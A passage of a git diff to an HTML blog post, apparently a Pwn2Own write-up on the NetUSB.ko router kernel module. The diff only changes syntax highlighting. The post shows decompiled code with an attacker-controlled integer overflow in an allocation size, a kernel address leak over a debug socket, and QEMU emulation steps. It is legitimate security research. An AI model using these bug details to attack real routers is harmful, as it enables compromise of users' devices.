@@ -221,48 +221,48 @@ tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      
 <p>This <a href="https://www.kcodes.com/product/1/36">NetUSB.ko</a> kernel module is actually a piece of software written by the <a href="https://www.kcodes.com/">KCodes</a> company to do USB over IP. The other wild stuff is that I remembered seeing this same module on my NETGEAR router. Weird. After googling around, it was also not a surprise to see that multiple vulnerabilities were discovered and exploited in the past and that indeed TP-Link was not the only router to ship this module.</p>
 <p>Although I didn't think it would be likely for me to find something interesting in there, I still invested time to look into it and get a feel for it. After a few days reverse-engineering this statically, it definitely looked much more complex than I initially thought and so I decided to stick with it for a bit longer.</p>
 <p>After grinding through it for a while things started to make sense: I had reverse-engineered some important structures and was able to follow the untrusted inputs deeper in the code. After enumerating a lot of places where the attacker inputs is parsed and used, I found this one spot where I could overflow an integer in arithmetic fed to an allocation function:</p>
-<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">SoftwareBus_dispatchNormalEPMsgOut</span><span class="p">(</span><span class="n">SbusConnection_t</span> <span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="kt">char</span> <span class="n">HostCommand</span><span class="p">,</span> <span class="kt">char</span> <span class="n">Opcode</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="nf">SoftwareBus_dispatchNormalEPMsgOut</span><span class="p">(</span><span class="n">SbusConnection_t</span><span class="w"> </span><span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">HostCommand</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">Opcode</span><span class="p">)</span>
 <span class="p">{</span>
-  <span class="c1">// ...</span>
-  <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">v64</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
-  <span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">_bswapw</span><span class="p">(</span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="o">&lt;-----------------------</span> <span class="n">attacker</span> <span class="n">controlled</span>
-    <span class="n">Payload_1</span> <span class="o">=</span> <span class="n">mallocPageBuf</span><span class="p">(</span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">9</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">);</span> <span class="o">&lt;----</span> <span class="n">overflow</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">Payload_1</span><span class="p">)</span> <span class="p">{</span>
-      <span class="c1">// ...</span>
-      <span class="k">if</span><span class="p">(</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">Payload_1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+<span class="w">  </span><span class="c1">// ...</span>
+<span class="w">  </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="n">v64</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_bswapw</span><span class="p">(</span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"> </span><span class="o">&lt;-----------------------</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">controlled</span>
+<span class="w">    </span><span class="n">Payload_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mallocPageBuf</span><span class="p">(</span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">9</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD0</span><span class="p">);</span><span class="w"> </span><span class="o">&lt;----</span><span class="w"> </span><span class="n">overflow</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">Payload_1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="c1">// ...</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="n">Payload_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
 </code></pre></div>
 
 
 <p>I first thought this was going to lead to a wild overflow type of bug because the code would try to read a very large number of bytes into this buffer but I still went ahead and crafted a PoC. That's when I realized that I was wrong. Looking carefuly, the <code>SoftwareBus_fillBuf</code> function is actually defined as follows:</p>
-<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection_t</span> <span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">Buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">BufferLen</span><span class="p">)</span> <span class="p">{</span>
-  <span class="k">if</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">)</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">if</span><span class="p">(</span><span class="n">BufferLen</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-          <span class="n">GetLen</span> <span class="o">=</span> <span class="n">KTCP_get</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">SbusConnection</span><span class="o">-&gt;</span><span class="n">ClientSocket</span><span class="p">,</span> <span class="n">Buffer</span><span class="p">,</span> <span class="n">BufferLen</span><span class="p">);</span>
-          <span class="k">if</span> <span class="p">(</span> <span class="n">GetLen</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
-            <span class="k">break</span><span class="p">;</span>
-          <span class="n">BufferLen</span> <span class="o">-=</span> <span class="n">GetLen</span><span class="p">;</span>
-          <span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">Buffer</span> <span class="o">+</span> <span class="n">GetLen</span><span class="p">;</span>
-          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">BufferLen</span> <span class="p">)</span>
-            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="n">kc_printf</span><span class="p">(</span><span class="s">&quot;INFO%04X: _fillBuf(): len = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">1275</span><span class="p">,</span> <span class="n">GetLen</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-      <span class="p">}</span>
-      <span class="k">else</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-      <span class="p">}</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-      <span class="c1">// ...</span>
-      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-  <span class="k">else</span> <span class="p">{</span>
-    <span class="c1">// ...</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="p">}</span>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection_t</span><span class="w"> </span><span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">BufferLen</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">Buffer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">BufferLen</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">GetLen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KTCP_get</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="n">SbusConnection</span><span class="o">-&gt;</span><span class="n">ClientSocket</span><span class="p">,</span><span class="w"> </span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="n">BufferLen</span><span class="p">);</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">GetLen</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+<span class="w">          </span><span class="n">BufferLen</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">GetLen</span><span class="p">;</span>
+<span class="w">          </span><span class="n">Buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">GetLen</span><span class="p">;</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">BufferLen</span><span class="w"> </span><span class="p">)</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">kc_printf</span><span class="p">(</span><span class="s">&quot;INFO%04X: _fillBuf(): len = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1275</span><span class="p">,</span><span class="w"> </span><span class="n">GetLen</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="c1">// ...</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// ...</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
@@ -324,18 +324,18 @@ tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      
 <p>Wow ok, so maybe I could do something useful with this bug. Still a long shot, but based on my understanding the bug would give me full control over the content and I was able to overflow the pages with pretty much as much data as I wanted. The only thing that I couldn't fully control was the size passed to the allocation. The only limitation was that I could only trigger a <code>mallocPageBuf</code> call with a size in the following interval: <code>[0, 8]</code> because of the integer overflow. <code>mallocPageBuf</code> aligns the passed size to the next power of two, and calculates the <code>order</code> (n in 2**n) to invoke <code>_get_free_pages</code>.</p>
 <p>Another good thing going for me was that the kernel didn't have KASLR, and I also noticed that the kernel did its best to keep running even when encountering access violations or whatnot. It wouldn't crash and reboot at the first hiccup on the road but instead try to run until it couldn't anymore. Sweet.</p>
 <p>I also eventually discovered that the driver was leaking kernel addresses over the network. In the above snippet, <code>kc_printf</code> is invoked with diagnostic / debug strings. Looking at its code, I realized the strings are actually sent over the network on a different port. I figured this could also be helpful for both synchronization and leaking some allocations made by the driver.</p>
-<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">kc_printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
-  <span class="c1">// ...</span>
-  <span class="n">v1</span> <span class="o">=</span> <span class="n">vsprintf</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
-  <span class="n">v2</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">257</span><span class="p">;</span>
-  <span class="n">v3</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
-  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">v2</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">v6</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">v3</span> <span class="o">=</span> <span class="mi">257</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="n">v5</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
-  <span class="n">kc_dbgD_send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span> <span class="c1">// &lt;-- send over socket</span>
-  <span class="k">return</span> <span class="n">printk</span><span class="p">(</span><span class="s">&quot;&lt;1&gt;%s&quot;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">kc_printf</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a1</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="c1">// ...</span>
+<span class="w">  </span><span class="n">v1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vsprintf</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span><span class="w"> </span><span class="n">a1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">v2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">257</span><span class="p">;</span>
+<span class="w">  </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">v2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">v6</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">257</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">v5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v3</span><span class="p">;</span>
+<span class="w">  </span><span class="n">kc_dbgD_send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="n">v3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;-- send over socket</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">printk</span><span class="p">(</span><span class="s">&quot;&lt;1&gt;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">v6</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div>
 
@@ -347,41 +347,41 @@ tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      
 <p>Turns out this was much harder than I thought. I started by trying to build the kernel via the GPL archive. In appearance, everything is there and a simple make should just work. But that didn't cut it. It took me weeks to actually get it to compile (right dependencies, patching bits here and there, ...), but I eventually did it. I had to try a bunch of toolchain versions, fix random files that would lead to errors on my Linux distribution, etc. To be honest I mostly forgot all the details here but I remember it being painful. If you are interested, I have zipped up the filesystem of this VM and you can find it here: <a href="https://github.com/0vercl0k/zenith/releases/download/v0/wheezy-openwrt-ath.tar.xz">wheezy-openwrt-ath.tar.xz</a>.</p>
 <p>I thought this was the end of my suffering but it was in fact not it. At all. The built kernel wouldn't boot in QEMU and would hang at boot time. I tried to understand what was going on, but it looked related to the emulated hardware and I was honestly out of my depth. I decided to look at the problem from a different angle. Instead, I downloaded a <a href="https://www.aurel32.net/info/debian_mips_qemu.php">Linux MIPS QEMU image</a> from <a href="https://www.aurel32.net/info/debian_mips_qemu.php">aurel32's website</a> that was booting just fine, and decided that I would try to merge both of the kernel configurations until I end up with a bootable image that has a configuration as close as possible from the kernel running on the device. Same kernel version, allocators, same drivers, etc. At least similar enough to be able to load the <code>NetUSB.ko</code> driver.</p>
 <p>Again, because I am a complete Linux noob I failed to really see the complexity there. So I got started on this journey where I must have compiled easily 100+ kernels until being able to load and execute the <code>NetUSB.ko</code> driver in QEMU. The main challenge that I failed to see was that in Linux land, configuration flags can change the size of internal structures. This means that if you are trying to run a driver A on kernel B, the driver A might mistake a structure to be of size C when it is in fact of size D. That's exactly what happened. Starting the driver in this QEMU image led to a ton of random crashes that I couldn't really explain at first. So I followed multiple rabbit holes until realizing that my kernel configuration was just not in agreement with what the driver expected. For example, the <a href="https://elixir.bootlin.com/linux/v3.3.8/source/include/linux/netdevice.h#L1016">net_device</a> defined below shows that its definition varies depending on kernel configuration options being on or off: <code>CONFIG_WIRELESS_EXT</code>, <code>CONFIG_VLAN_8021Q</code>, <code>CONFIG_NET_DSA</code>, <code>CONFIG_SYSFS</code>, <code>CONFIG_RPS</code>, <code>CONFIG_RFS_ACCEL</code>, etc. But that's not all. Any types used by this structure can do the same which means that looking at the main definition of a structure is not enough.</p>
-<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="n">net_device</span> <span class="p">{</span>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">net_device</span><span class="w"> </span><span class="p">{</span>
 <span class="c1">// ...</span>
 <span class="cp">#ifdef CONFIG_WIRELESS_EXT</span>
-  <span class="cm">/* List of functions to handle Wireless Extensions (instead of ioctl).</span>
+<span class="w">  </span><span class="cm">/* List of functions to handle Wireless Extensions (instead of ioctl).</span>
 <span class="cm">   * See &lt;net/iw_handler.h&gt; for details. Jean II */</span>
-  <span class="k">const</span> <span class="k">struct</span> <span class="n">iw_handler_def</span> <span class="o">*</span> <span class="n">wireless_handlers</span><span class="p">;</span>
-  <span class="cm">/* Instance data managed by the core of Wireless Extensions. */</span>
-  <span class="k">struct</span> <span class="n">iw_public_data</span> <span class="o">*</span> <span class="n">wireless_data</span><span class="p">;</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">iw_handler_def</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">wireless_handlers</span><span class="p">;</span>
+<span class="w">  </span><span class="cm">/* Instance data managed by the core of Wireless Extensions. */</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">iw_public_data</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">wireless_data</span><span class="p">;</span>
 <span class="cp">#endif</span>
 <span class="c1">// ...</span>
 <span class="cp">#if IS_ENABLED(CONFIG_VLAN_8021Q)</span>
-  <span class="k">struct</span> <span class="n">vlan_info</span> <span class="n">__rcu</span>  <span class="o">*</span><span class="n">vlan_info</span><span class="p">;</span> <span class="cm">/* VLAN info */</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">vlan_info</span><span class="w"> </span><span class="n">__rcu</span><span class="w">  </span><span class="o">*</span><span class="n">vlan_info</span><span class="p">;</span><span class="w"> </span><span class="cm">/* VLAN info */</span>
 <span class="cp">#endif</span>
 <span class="cp">#if IS_ENABLED(CONFIG_NET_DSA)</span>
-  <span class="k">struct</span> <span class="n">dsa_switch_tree</span>  <span class="o">*</span><span class="n">dsa_ptr</span><span class="p">;</span> <span class="cm">/* dsa specific data */</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">dsa_switch_tree</span><span class="w">  </span><span class="o">*</span><span class="n">dsa_ptr</span><span class="p">;</span><span class="w"> </span><span class="cm">/* dsa specific data */</span>
 <span class="cp">#endif</span>
 <span class="c1">// ...</span>
 <span class="cp">#ifdef CONFIG_SYSFS</span>
-  <span class="k">struct</span> <span class="n">kset</span>   <span class="o">*</span><span class="n">queues_kset</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">kset</span><span class="w">   </span><span class="o">*</span><span class="n">queues_kset</span><span class="p">;</span>
 <span class="cp">#endif</span>
 
 <span class="cp">#ifdef CONFIG_RPS</span>
-  <span class="k">struct</span> <span class="n">netdev_rx_queue</span>  <span class="o">*</span><span class="n">_rx</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">netdev_rx_queue</span><span class="w">  </span><span class="o">*</span><span class="n">_rx</span><span class="p">;</span>
 
-  <span class="cm">/* Number of RX queues allocated at register_netdev() time */</span>
-  <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">num_rx_queues</span><span class="p">;</span>
+<span class="w">  </span><span class="cm">/* Number of RX queues allocated at register_netdev() time */</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">    </span><span class="n">num_rx_queues</span><span class="p">;</span>
 
-  <span class="cm">/* Number of RX queues currently active in device */</span>
-  <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">real_num_rx_queues</span><span class="p">;</span>
+<span class="w">  </span><span class="cm">/* Number of RX queues currently active in device */</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">    </span><span class="n">real_num_rx_queues</span><span class="p">;</span>
 
 <span class="cp">#ifdef CONFIG_RFS_ACCEL</span>
-  <span class="cm">/* CPU reverse-mapping for RX completion interrupts, indexed</span>
+<span class="w">  </span><span class="cm">/* CPU reverse-mapping for RX completion interrupts, indexed</span>
 <span class="cm">   * by RX queue number.  Assigned by driver.  This must only be</span>
 <span class="cm">   * set if the ndo_rx_flow_steer operation is defined. */</span>
-  <span class="k">struct</span> <span class="n">cpu_rmap</span>   <span class="o">*</span><span class="n">rx_cpu_rmap</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">cpu_rmap</span><span class="w">   </span><span class="o">*</span><span class="n">rx_cpu_rmap</span><span class="p">;</span>
 <span class="cp">#endif</span>
 <span class="cp">#endif</span>
 <span class="c1">//...</span>
@@ -391,27 +391,27 @@ tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      
 
 <p>Once I figured that out, I went through a pretty lengthy process of trial and error. I would start the driver, get information about the crash and try to look at the code / structures involved and see if a kernel configuration option would impact the layout of a relevant structure. From there, I could see the difference between the kernel configuration for my bootable QEMU image and the kernel I had built from the GPL and see where were mismatches. If there was one, I could simply turn the option on or off, recompile and hope that it doesn't make the kernel unbootable under QEMU.</p>
 <p>After at least 136 compilations (the number of times I found <code>make ARCH=mips</code> in one of my <code>.bash_history</code> 😅) and an enormous amount of frustration, I eventually built a Linux kernel version able to run <code>NetUSB.ko</code> 😲:</p>
-<div class="highlight"><pre><span></span><code>over@panther:~/pwn2own$ qemu-system-mips -m 128M -nographic -append <span class="s2">&quot;root=/dev/sda1 mem=128M&quot;</span> -kernel linux338.vmlinux.elf -M malta -cpu 74Kf -s -hda debian_wheezy_mips_standard.qcow2 -net nic,netdev<span class="o">=</span>network0 -netdev user,id<span class="o">=</span>network0,hostfwd<span class="o">=</span>tcp:127.0.0.1:20005-10.0.2.15:20005,hostfwd<span class="o">=</span>tcp:127.0.0.1:33344-10.0.2.15:33344,hostfwd<span class="o">=</span>tcp:127.0.0.1:31337-10.0.2.15:31337
+<div class="highlight"><pre><span></span><code>over@panther:~/pwn2own$<span class="w"> </span>qemu-system-mips<span class="w"> </span>-m<span class="w"> </span>128M<span class="w"> </span>-nographic<span class="w"> </span>-append<span class="w"> </span><span class="s2">&quot;root=/dev/sda1 mem=128M&quot;</span><span class="w"> </span>-kernel<span class="w"> </span>linux338.vmlinux.elf<span class="w"> </span>-M<span class="w"> </span>malta<span class="w"> </span>-cpu<span class="w"> </span>74Kf<span class="w"> </span>-s<span class="w"> </span>-hda<span class="w"> </span>debian_wheezy_mips_standard.qcow2<span class="w"> </span>-net<span class="w"> </span>nic,netdev<span class="o">=</span>network0<span class="w"> </span>-netdev<span class="w"> </span>user,id<span class="o">=</span>network0,hostfwd<span class="o">=</span>tcp:127.0.0.1:20005-10.0.2.15:20005,hostfwd<span class="o">=</span>tcp:127.0.0.1:33344-10.0.2.15:33344,hostfwd<span class="o">=</span>tcp:127.0.0.1:31337-10.0.2.15:31337
 <span class="o">[</span>...<span class="o">]</span>
-root@debian-mips:~# ./start.sh
-<span class="o">[</span>   <span class="m">89</span>.092000<span class="o">]</span> new slab @ <span class="m">86964000</span>
-<span class="o">[</span>   <span class="m">89</span>.108000<span class="o">]</span> kcg <span class="m">333</span> :GPL NetUSB up!
-<span class="o">[</span>   <span class="m">89</span>.240000<span class="o">]</span> NetUSB: module license <span class="s1">&#39;Proprietary&#39;</span> taints kernel.
-<span class="o">[</span>   <span class="m">89</span>.240000<span class="o">]</span> Disabling lock debugging due to kernel taint
-<span class="o">[</span>   <span class="m">89</span>.268000<span class="o">]</span> kc   <span class="m">90</span> : run_telnetDBGDServer start
-<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> kc  <span class="m">227</span> : init_DebugD end
-<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17F8: NetUSB <span class="m">1</span>.02.69, <span class="m">00030308</span> : Jun <span class="m">11</span> <span class="m">2015</span> <span class="m">18</span>:15:00
-<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17FA: <span class="m">7437</span>: Archer C7    :Archer C7
-<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17FB:  AUTH ISOC
-<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17FC:  filterAudio
-<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> usbcore: registered new interface driver KC NetUSB General Driver
-<span class="o">[</span>   <span class="m">89</span>.276000<span class="o">]</span> INFO0145:  init proc : PAGE_SIZE <span class="m">4096</span>
-<span class="o">[</span>   <span class="m">89</span>.280000<span class="o">]</span> INFO16EC:  infomap 869c6e38
-<span class="o">[</span>   <span class="m">89</span>.280000<span class="o">]</span> INFO16EF:  sleep to <span class="nb">wait</span> eth0 to wake up
-<span class="o">[</span>   <span class="m">89</span>.280000<span class="o">]</span> INFO15BF: tcpConnector<span class="o">()</span> started... : eth0
-NetUSB <span class="m">160207</span> <span class="m">0</span> - Live 0x869c0000 <span class="o">(</span>P<span class="o">)</span>
-GPL_NetUSB <span class="m">3409</span> <span class="m">1</span> NetUSB, Live 0x8694f000
-root@debian-mips:~# <span class="o">[</span>   <span class="m">92</span>.308000<span class="o">]</span> INFO1572: Bind to eth0
+root@debian-mips:~#<span class="w"> </span>./start.sh
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.092000<span class="o">]</span><span class="w"> </span>new<span class="w"> </span>slab<span class="w"> </span>@<span class="w"> </span><span class="m">86964000</span>
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.108000<span class="o">]</span><span class="w"> </span>kcg<span class="w"> </span><span class="m">333</span><span class="w"> </span>:GPL<span class="w"> </span>NetUSB<span class="w"> </span>up!
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.240000<span class="o">]</span><span class="w"> </span>NetUSB:<span class="w"> </span>module<span class="w"> </span>license<span class="w"> </span><span class="s1">&#39;Proprietary&#39;</span><span class="w"> </span>taints<span class="w"> </span>kernel.
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.240000<span class="o">]</span><span class="w"> </span>Disabling<span class="w"> </span>lock<span class="w"> </span>debugging<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>kernel<span class="w"> </span>taint
